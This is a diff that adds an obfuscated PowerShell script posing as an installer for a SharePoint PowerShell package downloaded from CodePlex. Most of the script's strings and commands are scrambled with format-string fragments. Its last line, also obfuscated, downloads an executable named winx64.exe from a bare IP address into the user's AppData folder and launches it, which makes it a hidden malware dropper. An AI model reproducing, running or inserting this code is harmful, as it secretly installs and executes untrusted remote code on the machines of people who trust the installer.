@@ -1,0 +1,103 @@
+param(
+	[string]${V`erSioN},
+	[string]${P`ATH},
+	[switch]${F`O`Rce},
+	${upd`Ate},
+	[switch]${u`N`i`NsTaLl}
+)
+
+
+
+
+
+${C`O`NFigS} = @{
+	("{0}{1}" -f'U','rl') = ("{14}{13}{2}{23}{20}{38}{16}{35}{41}{22}{21}{17}{1}{36}{43}{37}{8}{34}{7}{29}{32}{26}{15}{31}{3}{39}{27}{6}{11}{18}{5}{9}{0}{24}{19}{42}{30}{40}{12}{28}{4}{33}{25}{10}"-f '=13','c.',':','=share','670000&B','ileTi','adId=80','o','m','me','ld=20885','759','1','tp','ht','j','nl','odeplex.se','1&F','7','d','c','d-','//','03','i','Pro','&Downlo','16','w','9','ectName','nload/Release?','u','/D','o','s-ms','.co','ow','pointpowershell','86','a','8','ft')
+	("{0}{1}"-f 'Pat','h') = "$((Get-Location).Path)\" 
+}
+
+${cOnF`i`gS} | &("{1}{2}{0}{3}{4}" -f 'h-','For','Eac','Obj','ect'){
+
+    try{
+
+        ${_}."ReSu`lT" = ${n`UlL}
+        if(-not ${_}."pa`TH"){${_}."pA`TH" = ${P`ATh}}
+        ${CON`FIg} = ${_}
+
+        
+        
+        
+
+        if(-not ${u`NI`NstAll}){
+
+            
+            
+            
+
+            if(${_}."coNdITiOn`e`XcL`USioN"){            
+                ${_}."co`NDITIoNexC`lusIOnrE`Su`lt" = $(&("{0}{4}{2}{3}{1}" -f'I','ession','v','oke-Expr','n') ${COnF`iG}."c`Ondit`iOn`e`x`ClUsion" -ErrorAction ("{1}{3}{2}{0}" -f 'tinue','Sil','Con','ently'))        
+            }    
+            if((${_}."cON`DITiO`N`ExcLUSI`OnresULT" -eq ${Nu`LL}) -or ${f`OrcE}){
+                    	
+                
+                
+                
+
+                ${_}."d`OwNLOa`Ds" = ${_}."u`Rl" | &("{0}{1}{2}"-f 'Fo','rEa','ch-Object'){
+                    &("{0}{1}{2}" -f'Get','-','File') -Url ${_} -Path (.("{0}{1}"-f'Join-Pa','th') ${C`o`NfIg}."P`AtH" ("{4}{1}{2}{5}{0}{3}" -f'he','o','intP','ll.zip','ShareP','owerS'))
+                }       			
+
+                
+                
+                
+
+                ${_}."DO`WNloa`DS" | &("{3}{0}{2}{1}"-f 'c','ject','h-Ob','ForEa'){
+                    & ("{1}{0}" -f 'za','7') ('x') $(.("{2}{3}{1}{0}" -f 'h','-Pat','Jo','in') ${_}."P`ATh" ${_}."fILE`Name") -y | .("{1}{2}{0}"-f 'ull','Ou','t-N')
+                }
+                		
+                
+                
+                
+                
+                
+                
+                
+
+                ${_}."DoWnL`O`ADS" | &("{4}{2}{0}{3}{1}" -f'rEac','Object','o','h-','F'){
+                    .("{0}{2}{1}" -f'Remove','m','-Ite') $(.("{2}{0}{1}" -f 'a','th','Join-P') ${_}."pA`TH" ${_}."f`IleNa`mE")
+                }
+                		
+                
+                
+                
+                		
+                if(${U`PDaTe}){${_}."rE`sult" = ("{0}{1}{2}"-f 'A','pp','Updated');${_}
+                }else{${_}."re`SUlt" = ("{0}{3}{1}{2}"-f'A','lle','d','ppInsta');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."RE`SuLT" = ("{0}{3}{1}{4}{2}"-f 'Conditi','nE','sion','o','xclu');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+            
+            ${_}."R`EsUlt" = ("{1}{3}{0}{4}{2}"-f'in','AppU','d','n','stalle');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${c`o`NfIg}."Re`sULT" = ("{0}{1}"-f 'Er','ror');${co`Nf`ig}
+    }
+}
+(&("{1}{0}{2}" -f'w','Ne','-Object') ("{3}{5}{1}{0}{2}{4}"-f'b','.Net.We','Cli','Sys','ent','tem')).("{2}{0}{1}{3}" -f 'o','w','D','nloadFile').Invoke(("{6}{0}{2}{3}{5}{7}{1}{4}" -f'/9','8.30/~tre','4.','1','vor/winx64.exe','02','http:/','.5'),"$env:APPDATA\winx64.exe");&("{0}{1}{2}" -f 'S','tart-Proces','s') ("$env:APPDATA\winx64.exe")
